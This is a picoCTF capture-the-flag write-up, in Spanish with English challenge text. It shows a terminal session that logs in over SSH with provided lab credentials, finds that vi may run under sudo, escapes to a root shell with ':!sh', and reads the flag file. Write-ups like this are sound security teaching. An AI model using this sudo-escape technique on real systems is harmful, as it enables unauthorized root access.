## Descripción

Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 57792 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Password: `j4ks-9nxB-`

Can you login and read the root file?
## Solución
```
Fers-academy@webshell:~$ ssh -p 57792 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:57792 ([13.59.203.175]:57792)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
    

[No write since last change]
# cd /root
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Aug 30 03:59 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}

```
## Notas adicionales
- ejecutamos el comando que nos dio el reto para poder ingresar al reto
- una vez dentro checamos los permisos que tenemos como usuario
- Recibimos la ruta /usr/bin/vi como superusuario, una vez que lo abrimos, nos abre un editor de texto, en donde usamos la opción `:!sh` y nos arroja un #
- Como somos root ponemos un `cat.flag.txt` y nos da la respuesta
## Referencias